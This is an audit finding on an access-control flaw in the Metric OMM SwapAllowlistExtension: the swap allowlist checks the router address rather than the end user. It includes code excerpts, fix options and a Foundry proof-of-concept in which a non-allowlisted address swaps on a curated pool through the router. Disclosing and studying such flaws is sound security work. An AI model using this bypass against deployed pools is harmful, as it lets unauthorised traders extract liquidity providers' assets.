### Title
SwapAllowlistExtension Gates the Router Address Instead of the Actual Swapper, Allowing Any User to Bypass the Curated-Pool Swap Allowlist - (File: metric-periphery/contracts/extensions/SwapAllowlistExtension.sol)

---

### Summary

`SwapAllowlistExtension.beforeSwap` checks `allowedSwapper[pool][sender]` where `sender` is `msg.sender` as seen by the pool — the router contract — not the end user. Any user who routes through the public `MetricOmmSimpleRouter` is checked as the router address. If the pool admin allowlists the router (required for any router-mediated swap to succeed), every user on the internet can bypass the allowlist and swap on a curated pool.

---

### Finding Description

**Call chain when a user swaps via the router:**

```
User → MetricOmmSimpleRouter.exactInputSingle(params)
         └─ pool.swap(params.recipient, ...)          // msg.sender = router
              └─ _beforeSwap(msg.sender=router, recipient=user, ...)
                   └─ SwapAllowlistExtension.beforeSwap(sender=router, ...)
                        └─ allowedSwapper[pool][router]  ← checked, NOT the user
```

In `MetricOmmPool.swap`, the pool passes `msg.sender` (the router) as the `sender` argument to `_beforeSwap`:

```solidity
// MetricOmmPool.sol line 230-240
_beforeSwap(
  msg.sender,      // <-- router address, not the end user
  recipient,
  ...
);
```

`ExtensionCalling._beforeSwap` forwards this verbatim to the extension:

```solidity
// ExtensionCalling.sol line 160-176
_callExtensionsInOrder(
  BEFORE_SWAP_ORDER,
  abi.encodeCall(
    IMetricOmmExtensions.beforeSwap,
    (sender, recipient, ...)   // sender = router
  )
);
```

`SwapAllowlistExtension.beforeSwap` then checks:

```solidity
// SwapAllowlistExtension.sol line 37-39
if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
  revert IMetricOmmPoolActions.NotAllowedToSwap();
}
```

Here `msg.sender` is the pool (correct key) and `sender` is the router (wrong actor). The allowlist lookup becomes `allowedSwapper[pool][router]`.

**The dilemma this creates for pool admins:**

| Admin action | Result |
|---|---|
| Do not allowlist the router | Allowlisted users cannot use the router at all |
| Allowlist the router | Every user on the internet can bypass the allowlist |

There is no configuration that achieves "only allowlisted users may swap via the router."

**Contrast with `DepositAllowlistExtension`**, which correctly checks `owner` (the position owner passed explicitly through the call chain), not `sender` (the adder/msg.sender). The deposit guard is correctly bound; the swap guard is not.

---

### Impact Explanation

A curated pool deploying `SwapAllowlistExtension` to restrict trading to specific counterparties (e.g., whitelisted market makers, KYC'd users, or protocol-controlled addresses) is fully bypassed the moment the pool admin allowlists the router. Any unprivileged user can call `MetricOmmSimpleRouter.exactInputSingle` and execute swaps on the restricted pool. Depending on the pool's purpose, this enables:

- Unauthorized extraction of LP assets at oracle-derived prices from a pool intended for private use.
- Circumvention of regulatory or risk-management controls the pool admin configured.
- Direct loss of LP principal if the pool was designed to trade only with trusted counterparties who would not exploit the oracle spread.

This matches the **Admin-boundary break** and **Broken core pool functionality causing loss of funds** impact categories.

---

### Likelihood Explanation

Likelihood is **High**:

1. `MetricOmmSimpleRouter` is the primary user-facing interface documented and deployed for the protocol.
2. Any pool admin who wants to allow even a single user to swap via the router must allowlist the router address, which simultaneously opens the pool to all users.
3. No special knowledge or privileged access is required — any user calls the public router.
4. The bypass is deterministic and requires zero preconditions beyond the router being allowlisted.

---

### Recommendation

The `beforeSwap` hook must gate the economically relevant actor. Two correct approaches:

**Option A — Pass the original caller through `extensionData`:** The router encodes `msg.sender` (the real user) into `extensionData` before calling the pool, and the extension decodes and checks it. This requires router cooperation and is trust-dependent.

**Option B — Check `recipient` instead of `sender`:** For swap allowlists, the `recipient` (the address receiving output tokens) is the economically relevant actor. Change the check to:

```solidity
function beforeSwap(address, address recipient, ...) external view override returns (bytes4) {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][recipient]) {
        revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
}
```

**Option C — Require direct pool calls for allowlisted pools:** Document that pools using `SwapAllowlistExtension` must not allowlist the router; users must call the pool directly. This is a design constraint, not a code fix.

Option B is the most robust on-chain fix, as `recipient` is always the address that receives value from the swap and cannot be spoofed by an intermediary.

---

### Proof of Concept

```solidity
// Setup: pool with SwapAllowlistExtension; only `trustedUser` is allowlisted
swapExtension.setAllowedToSwap(address(pool), trustedUser, true);
// Admin also allowlists the router so trustedUser can use it
swapExtension.setAllowedToSwap(address(pool), address(router), true);

// Attack: attacker (not allowlisted) bypasses the guard via the router
address attacker = makeAddr("attacker");
vm.startPrank(attacker);
token0.approve(address(router), type(uint256).max);

// This should revert with NotAllowedToSwap — but it succeeds
// because the extension checks allowedSwapper[pool][router] = true
router.exactInputSingle(
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        recipient: attacker,
        tokenIn: address(token0),
        zeroForOne: true,
        amountIn: 1000e18,
        amountOutMinimum: 0,
        priceLimitX64: 0,
        deadline: block.timestamp + 1,
        extensionData: ""
    })
);
// Attacker successfully swaps on a pool they are not allowlisted for
```

**Root cause line references:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-core/contracts/ExtensionCalling.sol (L160-177)
```text
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
  }
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L71-80)
```text
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
```
